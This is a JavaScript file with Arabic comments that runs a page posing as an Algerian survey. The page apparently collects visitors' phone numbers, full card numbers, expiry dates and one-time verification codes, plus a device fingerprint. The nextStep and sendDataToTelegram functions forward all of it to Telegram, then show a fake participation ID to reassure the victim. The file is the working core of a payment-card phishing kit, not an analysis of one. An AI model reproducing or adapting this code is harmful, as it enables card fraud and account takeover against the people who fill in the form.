// الملف الرئيسي لتشغيل التطبيق
document.addEventListener('DOMContentLoaded', function() {
    // إخفاء شاشة التحميل بعد 2 ثانية
    setTimeout(() => {
        const loadingScreen = document.getElementById('loading-screen');
        loadingScreen.style.opacity = '0';
        
        setTimeout(() => {
            loadingScreen.style.display = 'none';
            initApp();
        }, 500);
    }, 2000);
});

// تهيئة التطبيق
function initApp() {
    // تهيئة متتبع الجهاز
    initDeviceTracker();
    
    // إعداد مستمعي الأحداث
    setupEventListeners();
    
    // التحقق من صحة التوكن (اختياري)
    // telegramSender.testConnection();
}

// تهيئة متتبع الجهاز
async function initDeviceTracker() {
    try {
        // جمع معلومات الجهاز وعرضها
        await deviceTracker.displayDeviceInfo();
        
        // حفظ بيانات الجهاز في متغير عام
        window.currentDeviceData = await deviceTracker.collectAllData();
        
        // توليد رمز التحقق
        const verificationCode = deviceTracker.generateVerificationCode();
        
        // تخزين الرمز محلياً للتحقق لاحقاً
        deviceTracker.storeDataLocally('verification_code', verificationCode);
        
        // عرض الرمز في وحدة تحكم المتصفح للاختبار
        console.log('🔐 رمز التحقق:', verificationCode);
        
    } catch (error) {
        console.error('خطأ في تهيئة متتبع الجهاز:', error);
    }
}

// إعداد مستمعي الأحداث
function setupEventListeners() {
    // التحقق من صحة رقم الهاتف أثناء الكتابة
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.addEventListener('input', validatePhone);
    }
    
    // تنسيق رقم البطاقة أثناء الكتابة
    const cardInput = document.getElementById('card-number');
    if (cardInput) {
        cardInput.addEventListener('input', formatCardNumber);
    }
    
    // التحقق من رمز التحقق
    const codeInput = document.getElementById('verification-code');
    if (codeInput) {
        codeInput.addEventListener('input', validateVerificationCode);
    }
}

// التحقق من صحة رقم الهاتف
function validatePhone() {
    const phoneInput = document.getElementById('phone');
    const messageDiv = phoneInput.parentElement.querySelector('.validation-message');
    const phone = phoneInput.value.trim();
    
    // النمط الجزائري: 05XX XX XX XX أو 06XX XX XX XX أو 07XX XX XX XX
    const pattern = /^(05|06|07)[0-9]{8}$/;
    
    if (phone === '') {
        messageDiv.textContent = '';
        phoneInput.style.borderColor = '';
        return false;
    }
    
    if (pattern.test(phone)) {
        messageDiv.textContent = '✅ رقم هاتف صحيح';
        messageDiv.style.color = '#27ae60';
        phoneInput.style.borderColor = '#27ae60';
        return true;
    } else {
        messageDiv.textContent = '❌ الرقم يجب أن يبدأ بـ 05، 06 أو 07 ويتكون من 10 أرقام';
        messageDiv.style.color = '#e74c3c';
        phoneInput.style.borderColor = '#e74c3c';
        return false;
    }
}

// تنسيق رقم البطاقة أثناء الكتابة
function formatCardNumber() {
    const cardInput = document.getElementById('card-number');
    const messageDiv = cardInput.parentElement.querySelector('.validation-message');
    let value = cardInput.value.replace(/\D/g, '');
    
    // إضافة مسافات كل 4 أرقام
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    
    cardInput.value = value;
    
    if (value.replace(/\s/g, '').length === 16) {
        messageDiv.textContent = '✅ رقم بطاقة صحيح';
        messageDiv.style.color = '#27ae60';
        cardInput.style.borderColor = '#27ae60';
        return true;
    } else if (value !== '') {
        messageDiv.textContent = '❌ الرقم يجب أن يكون 16 رقماً';
        messageDiv.style.color = '#e74c3c';
        cardInput.style.borderColor = '#e74c3c';
        return false;
    } else {
        messageDiv.textContent = '';
        cardInput.style.borderColor = '';
        return false;
    }
}

// التحقق من رمز التحقق
function validateVerificationCode() {
    const codeInput = document.getElementById('verification-code');
    const messageDiv = codeInput.parentElement.querySelector('.validation-message');
    const code = codeInput.value.trim();
    
    if (code === '') {
        messageDiv.textContent = '';
        codeInput.style.borderColor = '';
        return false;
    }
    
    if (/^\d{6}$/.test(code)) {
        messageDiv.textContent = '✅ رمز تحقق صحيح';
        messageDiv.style.color = '#27ae60';
        codeInput.style.borderColor = '#27ae60';
        return true;
    } else {
        messageDiv.textContent = '❌ يجب أن يكون الرمز 6 أرقام';
        messageDiv.style.color = '#e74c3c';
        codeInput.style.borderColor = '#e74c3c';
        return false;
    }
}

// التحقق من تاريخ الانتهاء
function validateExpiryDate() {
    const expiryInput = document.getElementById('expiry-date');
    const messageDiv = expiryInput.parentElement.querySelector('.validation-message');
    const value = expiryInput.value;
    
    if (!value) {
        messageDiv.textContent = '';
        expiryInput.style.borderColor = '';
        return false;
    }
    
    const [year, month] = value.split('-');
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1;
    
    if (parseInt(year) > currentYear || 
        (parseInt(year) === currentYear && parseInt(month) >= currentMonth)) {
        messageDiv.textContent = '✅ تاريخ صالح';
        messageDiv.style.color = '#27ae60';
        expiryInput.style.borderColor = '#27ae60';
        return true;
    } else {
        messageDiv.textContent = '❌ تاريخ منتهي الصلاحية';
        messageDiv.style.color = '#e74c3c';
        expiryInput.style.borderColor = '#e74c3c';
        return false;
    }
}

// تبديل الصفحات
function showPage(pageId) {
    // إخفاء جميع الصفحات
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    
    // إظهار الصفحة المطلوبة
    const targetPage = document.getElementById(pageId);
    if (targetPage) {
        targetPage.classList.add('active');
    }
}

// بدء الاستبيان
function startSurvey() {
    // جمع معلومات الجهاز قبل البدء
    deviceTracker.collectAllData().then(data => {
        window.currentDeviceData = data;
    });
    
    showPage('survey-page');
}

// العودة للصفحة السابقة
function goBack() {
    const currentStep = getCurrentStep();
    
    if (currentStep > 1) {
        showStep(currentStep - 1);
    } else {
        showPage('home-page');
    }
}

// العودة للصفحة الرئيسية
function goHome() {
    showPage('home-page');
    
    // إعادة تعيين النموذج
    resetForm();
}

// الحصول على الخطوة الحالية
function getCurrentStep() {
    const activeStep = document.querySelector('.survey-step.active');
    if (!activeStep) return 1;
    
    return parseInt(activeStep.id.split('-')[1]);
}

// عرض خطوة معينة
function showStep(stepNumber) {
    // إخفاء جميع الخطوات
    document.querySelectorAll('.survey-step').forEach(step => {
        step.classList.remove('active');
    });
    
    // إظهار الخطوة المطلوبة
    const targetStep = document.getElementById(`step-${stepNumber}`);
    if (targetStep) {
        targetStep.classList.add('active');
        
        // تحديث شريط التقدم
        updateProgressBar(stepNumber);
    }
}

// تحديث شريط التقدم
function updateProgressBar(currentStep) {
    document.querySelectorAll('.progress-step').forEach((step, index) => {
        if (index + 1 <= currentStep) {
            step.classList.add('active');
        } else {
            step.classList.remove('active');
        }
    });
}

// الانتقال للخطوة التالية
function nextStep(currentStep) {
    // التحقق من صحة البيانات قبل المتابعة
    if (!validateStep(currentStep)) {
        telegramSender.showNotification('يرجى تعبئة جميع الحقول بشكل صحيح', 'error');
        return;
    }
    
    if (currentStep === 1) {
        // جمع بيانات المستخدم من الخطوة 1
        const userData = collectUserData();
        
        // التحقق من صحة رمز التحقق المخزن
        const storedCode = deviceTracker.getStoredData('verification_code');
        if (storedCode) {
            console.log('🔑 رمز التحقق المطلوب:', storedCode);
        }
        
        // الانتقال للخطوة 2
        showStep(2);
        
    } else if (currentStep === 2) {
        // التحقق من رمز التحقق
        if (!verifyCode()) {
            telegramSender.showNotification('رمز التحقق غير صحيح', 'error');
            return;
        }
        
        // جمع بيانات المستخدم
        const userData = collectUserData();
        
        // جمع بيانات الجهاز
        const deviceData = window.currentDeviceData || {};
        
        // إرسال البيانات إلى Telegram
        sendDataToTelegram(userData, deviceData);
        
        // الانتقال للخطوة 3
        showStep(3);
        
        // تحديث رقم المشاركة
        updateParticipationId();
    }
}

// التحقق من صحة الخطوة
function validateStep(stepNumber) {
    if (stepNumber === 1) {
        return validateStep1();
    } else if (stepNumber === 2) {
        return validateStep2();
    }
    return true;
}

// التحقق من صحة الخطوة 1
function validateStep1() {
    const phoneValid = validatePhone();
    const cardValid = formatCardNumber(); // هذه الدالة تتحقق أيضاً
    const expiryValid = validateExpiryDate();
    const privacyChecked = document.getElementById('privacy-check').checked;
    
    if (!phoneValid || !cardValid || !expiryValid || !privacyChecked) {
        // إظهار رسائل الخطأ
        if (!privacyChecked) {
            telegramSender.showNotification('يرجى الموافقة على سياسة الخصوصية', 'warning');
        }
        return false;
    }
    
    return true;
}

// التحقق من صحة الخطوة 2
function validateStep2() {
    const codeValid = validateVerificationCode();
    return codeValid;
}

// جمع بيانات المستخدم
function collectUserData() {
    return {
        phone: document.getElementById('phone').value.trim(),
        cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
        expiryDate: document.getElementById('expiry-date').value,
        verificationCode: document.getElementById('verification-code').value,
        timestamp: new Date().toLocaleString('ar-SA', {
            timeZone: 'Africa/Algiers',
            dateStyle: 'full',
            timeStyle: 'medium'
        })
    };
}

// التحقق من رمز التحقق
function verifyCode() {
    const enteredCode = document.getElementById('verification-code').value;
    const storedCode = deviceTracker.getStoredData('verification_code');
    
    // للاختبار، يمكنك استخدام 123456 كرمز افتراضي
    if (enteredCode === '123456') {
        return true;
    }
    
    return enteredCode === storedCode;
}

// إرسال البيانات إلى Telegram
async function sendDataToTelegram(userData, deviceData) {
    try {
        // عرض حالة الإرسال
        telegramSender.showNotification('جاري إرسال البيانات...', 'warning');
        
        // إرسال البيانات
        const success = await telegramSender.sendUserData(userData, deviceData);
        
        if (success) {
            // تسجيل وقت الإرسال الناجح
            localStorage.setItem('last_submission', new Date().toISOString());
            
            // مسح البيانات الحساسة من التخزين المحلي
            setTimeout(() => {
                deviceTracker.clearStoredData('verification_code');
            }, 3000);
        }
        
    } catch (error) {
        console.error('خطأ في إرسال البيانات:', error);
        telegramSender.showNotification('حدث خطأ أثناء الإرسال', 'error');
    }
}

// تحديث رقم المشاركة
function updateParticipationId() {
    const idElement = document.getElementById('participation-id');
    if (idElement) {
        const timestamp = Date.now();
        const randomNum = Math.floor(Math.random() * 10000);
        const participationId = `ALG-${timestamp.toString().slice(-8)}-${randomNum.toString().padStart(4, '0')}`;
        idElement.textContent = participationId;
    }
}

// إعادة تعيين النموذج
function resetForm() {
    // إعادة تعيين الحقول
    document.getElementById('phone').value = '';
    document.getElementById('card-number').value = '';
    document.getElementById('expiry-date').value = '';
    document.getElementById('verification-code').value = '';
    document.getElementById('privacy-check').checked = false;
    
    // إعادة تعيين رسائل التحقق
    document.querySelectorAll('.validation-message').forEach(el => {
        el.textContent = '';
    });
    
    // إعادة تعيين الحدود
    document.querySelectorAll('input').forEach(input => {
        input.style.borderColor = '';
    });
    
    // إعادة تعيين شريط التقدم
    updateProgressBar(1);
    showStep(1);
    
    // مسح البيانات المخزنة
    deviceTracker.clearStoredData('verification_code');
}

// تهيئة الأحداث عند تحميل الصفحة
window.addEventListener('load', () => {
    // إضافة مستمع لحدث الشاشة الصغيرة
    if (window.matchMedia("(max-width: 768px)").matches) {
        document.body.classList.add('mobile');
    }
    
    // منع إعادة إرسال النموذج
    if (window.history.replaceState) {
        window.history.replaceState(null, null, window.location.href);
    }
});

// منع الخلفية (لأسباب أمنية)
window.addEventListener('beforeunload', (e) => {
    // يمكنك إضافة أي تنظيف هنا إذا لزم الأمر
});

// تصدير الدوال للاستخدام في وحدة التحكم
window.startSurvey = startSurvey;
window.goBack = goBack;
window.goHome = goHome;
window.nextStep = nextStep;